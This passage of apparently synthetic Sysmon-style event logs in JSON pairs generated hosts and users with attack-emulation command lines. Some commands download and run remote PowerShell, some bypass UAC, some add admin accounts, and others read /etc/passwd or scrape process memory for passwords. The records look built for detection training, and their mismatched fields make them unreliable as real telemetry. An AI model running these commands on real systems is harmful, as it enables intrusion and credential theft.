        "EventType": "File Create",
        "ComputerName": "db-71.price-anderson.com",
        "User": "robertsalazar",
        "ProcessID": 8293,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"nltest /domain_trusts\\nnltest /trusted_domains\\n\",",
        "LogonID": 165769,
        "LogonGuid": "fc5dfee2-a66b-42e4-bd6a-76ba098cefe9",
        "SourceProcessID": 1368,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\forward..exe",
        "DestinationProcessID": 6712,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\artist..exe",
        "UtcTime": "2024-05-17T01:36:51.845064Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-41.peterson-murphy.net",
        "User": "nelsonbreanna",
        "ProcessID": 2579,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"truncate -s +1 #{file_to_pad} #adds a byte to the file size\\n\",",
        "LogonID": 425296,
        "LogonGuid": "c579000b-0fa8-4b25-88d6-5e8fce8a82f3",
        "SourceProcessID": 2105,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\fast..exe",
        "DestinationProcessID": 5524,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\hundred..dll",
        "UtcTime": "2024-05-17T01:36:51.845064Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-66.graham.org",
        "User": "michaelscott",
        "ProcessID": 5535,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"net localgroup\\nnet group /domain\\nnet group \\\"enterprise admins\\\" /domain\\nnet group \\\"domain admins\\\" /domain\\n\",",
        "LogonID": 619872,
        "LogonGuid": "e14e3754-7bd3-425b-8614-8a7617a7084c",
        "SourceProcessID": 9964,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\career..exe",
        "DestinationProcessID": 2503,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\guy..dll",
        "UtcTime": "2024-05-17T01:36:51.846064Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-55.simmons.com",
        "User": "jensenkatherine",
        "ProcessID": 6878,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"mv #{settings_json_def} #{settings_json_tmp}\\nInvoke-WebRequest \\\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true\\\" -OutFile \\\"#{settings_json_def}\\\"\\nwt.exe\\n\",",
        "LogonID": 248169,
        "LogonGuid": "3f3101dd-778a-4eba-83fb-3e6a22783d2a",
        "SourceProcessID": 4969,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\surface..dll",
        "DestinationProcessID": 9915,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\skin..dll",
        "UtcTime": "2024-05-17T01:36:51.846064Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-80.owens.com",
        "User": "bmartin",
        "ProcessID": 6294,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"conhost.exe \\\"#{process}\\\"\\n\",",
        "LogonID": 651157,
        "LogonGuid": "2ee2b30d-85a5-423e-8085-33bde9f5bd96",
        "SourceProcessID": 3363,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\standard..exe",
        "DestinationProcessID": 6050,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\team..exe",
        "UtcTime": "2024-05-17T01:36:51.846064Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-98.hester.com",
        "User": "christy37",
        "ProcessID": 1794,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\\n\",",
        "LogonID": 749650,
        "LogonGuid": "a8f2886d-1036-400b-aed0-08fc5180d614",
        "SourceProcessID": 5910,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\find..dll",
        "DestinationProcessID": 1232,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\argue..exe",
        "UtcTime": "2024-05-17T01:36:51.846064Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-42.sparks-benson.info",
        "User": "kelli36",
        "ProcessID": 8240,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"Get-Service WinDefend #check the service state of Windows Defender\\nGet-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc\\nGet-MpThreat #threats details that have been detected using MS Defender\\n\",",
        "LogonID": 407361,
        "LogonGuid": "fa6517ac-cfc2-43c9-b021-446fb6d5f489",
        "SourceProcessID": 2971,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\season..exe",
        "DestinationProcessID": 5006,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\want..exe",
        "UtcTime": "2024-05-17T01:36:51.847065Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-05.blanchard-clark.com",
        "User": "hannajulie",
        "ProcessID": 3577,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"New-Item -Force -Path \\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\" -Value '#{command_to_execute}'\\nNew-ItemProperty -Force -Path \\\"HKCU:\\\\Software\\\\Classes\\\\Folder\\\\shell\\\\open\\\\command\\\" -Name \\\"DelegateExecute\\\"\\nStart-Process -FilePath $env:windir\\\\system32\\\\sdclt.exe\\nStart-Sleep -s 3\\n\",",
        "LogonID": 562820,
        "LogonGuid": "61c5b712-b9a4-4567-8841-c876faffefab",
        "SourceProcessID": 6470,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\increase..exe",
        "DestinationProcessID": 8565,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\year..dll",
        "UtcTime": "2024-05-17T01:36:51.847065Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-87.dean.org",
        "User": "hwright",
        "ProcessID": 8617,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\svchost.exe\\nC:\\\\svchost.exe /c echo T1105 > \\\\\\\\localhost\\\\c$\\\\T1105.txt\\n\",",
        "LogonID": 682857,
        "LogonGuid": "c891c993-1ca6-4e6a-af53-a70f703d3adc",
        "SourceProcessID": 8720,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\property..exe",
        "DestinationProcessID": 2181,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\different..dll",
        "UtcTime": "2024-05-17T01:36:51.847065Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-08.taylor-johnson.com",
        "User": "strongcassandra",
        "ProcessID": 4034,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"get-localgroup\\nGet-LocalGroupMember -Name \\\"Administrators\\\"\\n\",",
        "LogonID": 936295,
        "LogonGuid": "bd01a65d-299e-4684-b8f1-b41f57522469",
        "SourceProcessID": 3943,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\nation..exe",
        "DestinationProcessID": 2788,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\follow..dll",
        "UtcTime": "2024-05-17T01:36:51.847065Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-51.hernandez.com",
        "User": "webbedward",
        "ProcessID": 1508,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')\",",
        "LogonID": 331622,
        "LogonGuid": "0f168e2a-ecac-4fc4-ad1d-494836c5cc55",
        "SourceProcessID": 4741,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\senior..exe",
        "DestinationProcessID": 2040,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\make..dll",
        "UtcTime": "2024-05-17T01:36:51.847065Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-79.flores-rodgers.biz",
        "User": "karenfrench",
        "ProcessID": 3754,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"mkdir ~/Library/Mail/copy\\ncp -R ~/Library/Mail/* ~/Library/Mail/copy\\necho \\\"Manipulated data\\\" > ~/Library/Mail/copy/manipulated.txt\\n\",",
        "LogonID": 176277,
        "LogonGuid": "0e4477b2-2a9d-48fc-aa51-3036e1619a6c",
        "SourceProcessID": 4059,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\learn..exe",
        "DestinationProcessID": 5317,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\factor..dll",
        "UtcTime": "2024-05-17T01:36:51.847065Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-79.burton-martin.com",
        "User": "jbeltran",
        "ProcessID": 5101,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\\n\",",
        "LogonID": 313594,
        "LogonGuid": "13ee530f-14cc-470a-aee6-b30efbacacf0",
        "SourceProcessID": 2289,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\these..dll",
        "DestinationProcessID": 5933,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\spend..exe",
        "UtcTime": "2024-05-17T01:36:51.848064Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-54.ross-black.info",
        "User": "rthompson",
        "ProcessID": 1448,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\\n\",",
        "LogonID": 622857,
        "LogonGuid": "402fd442-660f-4205-b79b-3620ad9f6e2e",
        "SourceProcessID": 7201,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\nearly..dll",
        "DestinationProcessID": 5698,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\agent..exe",
        "UtcTime": "2024-05-17T01:36:51.848064Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-52.foster.com",
        "User": "ypierce",
        "ProcessID": 2922,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"import-module \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\SharpHound.ps1\\\"\\ntry { Invoke-BloodHound -OutputDirectory $env:Temp }\\ncatch { $_; exit $_.Exception.HResult}\\nStart-Sleep 5\\n\",",
        "LogonID": 647949,
        "LogonGuid": "8681c096-dc12-42f6-8e49-a45bb5e42702",
        "SourceProcessID": 5405,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\season..dll",
        "DestinationProcessID": 2762,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\already..exe",
        "UtcTime": "2024-05-17T01:36:51.848064Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-71.smith-larsen.org",
        "User": "bcisneros",
        "ProcessID": 3828,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$OriginalCommand = '#{powershell_command}'\\n$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)\\n$EncodedCommand =[Convert]::ToBase64String($Bytes)\\n$EncodedCommand\\npowershell.exe -EncodedCommand $EncodedCommand\\n\",",
        "LogonID": 569944,
        "LogonGuid": "38a569c7-c50f-4863-9f9f-8a63b9466fc2",
        "SourceProcessID": 8406,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\home..dll",
        "DestinationProcessID": 4485,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\here..dll",
        "UtcTime": "2024-05-17T01:36:51.848064Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-79.cannon.com",
        "User": "thomas04",
        "ProcessID": 8047,
        "ProcessName": "nc.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\build\\\\namedpipes_executor.exe\\\" --pipe 2\\n\",",
        "LogonID": 101894,
        "LogonGuid": "ac1a3d9f-2717-4af4-b86a-7101b1af6d78",
        "SourceProcessID": 5765,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\chair..dll",
        "DestinationProcessID": 9497,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\blue..exe",
        "UtcTime": "2024-05-17T01:36:51.848064Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-42.reynolds.net",
        "User": "williammyers",
        "ProcessID": 1942,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nRBCD-Check -consoleoutput -noninteractive\",",
        "LogonID": 464022,
        "LogonGuid": "6dd3283a-1887-405d-ba8c-d0611728886c",
        "SourceProcessID": 7259,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\big..dll",
        "DestinationProcessID": 9909,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\ahead..dll",
        "UtcTime": "2024-05-17T01:36:51.849064Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-76.brewer.com",
        "User": "dmartinez",
        "ProcessID": 8165,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sh #{script_path}\\nPID=$(pgrep -n -f \\\"#{pid_term}\\\")\\nPYTHON=$(which python || which python3 || which python2)\\n$PYTHON #{python_script} $PID #{output_file}\\ngrep -i \\\"PASS\\\" \\\"#{output_file}\\\"\\n\",",
        "LogonID": 912491,
        "LogonGuid": "b47d3409-163a-41bc-882b-20017b3d47ab",
        "SourceProcessID": 9938,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\as..exe",
        "DestinationProcessID": 9106,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\each..dll",
        "UtcTime": "2024-05-17T01:36:51.849064Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-89.patterson-allen.com",
        "User": "toddjackson",
        "ProcessID": 1436,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-PSSession -ComputerName #{hostname_to_connect}\\nTest-Connection $env:COMPUTERNAME\\nSet-Content -Path $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use -Value \\\"T1086 PowerShell Session Creation and Use\\\"\\nGet-Content -Path $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use\\nRemove-Item -Force $env:TEMP\\\\T1086_PowerShell_Session_Creation_and_Use\\n\",",
        "LogonID": 814877,
        "LogonGuid": "64c1765c-4f26-470c-ada1-13b060a7602b",
        "SourceProcessID": 3497,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\as..exe",
        "DestinationProcessID": 7434,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\effort..dll",
        "UtcTime": "2024-05-17T01:36:51.849064Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-01.hanson-cole.net",
        "User": "fbowman",
        "ProcessID": 7121,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin\",",
        "LogonID": 634502,
        "LogonGuid": "d5d07d98-faab-4a99-9c97-bf9c4e371d79",
        "SourceProcessID": 4232,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\read..dll",
        "DestinationProcessID": 4596,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\important..exe",
        "UtcTime": "2024-05-17T01:36:51.849064Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-12.lee.info",
        "User": "brownvanessa",
        "ProcessID": 7176,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"cat /etc/passwd > #{output_file}\\ncat #{output_file}\\n\",",
        "LogonID": 789291,
        "LogonGuid": "1fda1515-eda9-434e-ad5c-aaf19037beb9",
        "SourceProcessID": 9706,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\together..dll",
        "DestinationProcessID": 9289,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\part..dll",
        "UtcTime": "2024-05-17T01:36:51.849064Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-96.moreno.net",
        "User": "vaustin",
        "ProcessID": 7813,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"sudo dscl . -create /Users/#{user_name} UniqueID 333\\n\",",
        "LogonID": 704450,
        "LogonGuid": "ba2d2f1c-a1a7-4027-a06d-8b1b95bb5840",
        "SourceProcessID": 7842,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\focus..dll",
        "DestinationProcessID": 6208,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\goal..exe",
        "UtcTime": "2024-05-17T01:36:51.850065Z"
    },
